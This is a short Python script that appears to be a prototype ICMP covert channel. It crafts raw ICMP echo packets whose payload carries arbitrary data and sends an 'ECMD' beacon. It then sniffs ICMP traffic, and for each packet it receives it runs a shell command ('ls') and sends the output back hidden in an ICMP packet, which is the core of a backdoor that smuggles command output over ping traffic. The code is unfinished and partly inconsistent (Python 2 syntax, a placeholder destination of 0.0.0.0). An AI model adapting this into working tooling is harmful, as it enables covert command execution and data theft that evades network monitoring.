import os
import select
import signal
import socket
import struct
import sys
import time
import subprocess
from scapy.all import *

def calculate_checksum(source_string):
	"""
	A port of the functionality of in_cksum() from ping.c
	Ideally this would act on the string as a series of 16-bit ints (host
	packed), but this works.
	Network data is big-endian, hosts are typically little-endian
	"""
	countTo = (int(len(source_string) / 2)) * 2
	sum = 0
	count = 0

	# Handle bytes in pairs (decoding as short ints)
	loByte = 0
	hiByte = 0
	while count < countTo:
		if (sys.byteorder == "little"):
			loByte = source_string[count]
			hiByte = source_string[count + 1]
		else:
			loByte = source_string[count + 1]
			hiByte = source_string[count]
		sum = sum + (ord(hiByte) * 256 + ord(loByte))
		count += 2

	# Handle last byte if applicable (odd-number of bytes)
	# Endianness should be irrelevant in this case
	if countTo < len(source_string): # Check for odd length
		loByte = source_string[len(source_string) - 1]
		sum += ord(loByte)

	sum &= 0xffffffff # Truncate sum to 32 bits (a variance from ping.c, which
					  # uses signed ints, but overflow is unlikely in ping)

	sum = (sum >> 16) + (sum & 0xffff)	# Add high 16 bits to low 16 bits
	sum += (sum >> 16)					# Add carry from above (if any)
	answer = ~sum & 0xffff				# Invert and truncate to 16 bits
	answer = socket.htons(answer)

	return answer

def send_packet(data_to_send):
    # ICMP parameters
    ICMP_ECHOREPLY = 0 # Echo reply (per RFC792)
    ICMP_ECHO = 8 # Echo request (per RFC792)
    ICMP_MAX_RECV = 2048 # Max size of incoming buffer

    MAX_SLEEP = 1000

    checksum = 0

    own_id = os.getpid() & 0xFFFF
    seq_number = 0
    packet_size=55

    # Make a dummy header with a 0 checksum.
    header = struct.pack(
    	"!BBHHH", ICMP_ECHO, 0, checksum, own_id, seq_number
    )

    #padBytes = []
    padBytes = data_to_send
    #startVal = 0x42
    #for i in range(startVal, startVal + (packet_size)):
    	#padBytes += [(i & 0xff)]  # Keep chars in the 0-255 range
    data = bytes(padBytes)

    # Calculate the checksum on the data and the dummy header.
    checksum = calculate_checksum(header + data) # Checksum is in network order

    # Now that we have the right checksum, we put that in. It's just easier
    # to make up a new header than to stuff it into the dummy.
    header = struct.pack(
    	"!BBHHH", ICMP_ECHO, 0, checksum, own_id, seq_number
    )

    packet = header + data

    print packet

    try:
    	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_ICMP)
    except socket.error , msg:
    	print 'Socket could not be created. Error Code : ' + str(msg[0]) + ' Message ' + msg[1]
    	sys.exit()

    s.sendto(packet, ("0.0.0.0", 0 ))


def pkt_callback(pkt):
    process = subprocess.Popen(['ls'], stdout=subprocess.PIPE)
    out, err = process.communicate()
    print out
    send_packet(out)

send_packet("ECMD")
sniff(iface="en0", prn=pkt_callback, filter="icmp", store=0)
